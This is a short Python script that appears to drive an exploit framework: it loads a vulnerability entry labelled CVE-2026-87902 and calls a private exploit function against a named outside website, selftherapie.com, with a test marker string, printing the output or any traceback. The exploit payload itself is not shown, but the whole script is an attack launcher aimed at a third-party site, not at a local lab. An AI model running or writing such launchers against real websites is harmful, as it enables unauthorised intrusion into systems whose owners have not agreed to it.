import traceback
from core import vuln
v = vuln.load("CVE-2026-87902")
try:
    print(vuln._exploit("https://www.selftherapie.com", v["exploit"], "PBLTEST123"))
except Exception:
    traceback.print_exc()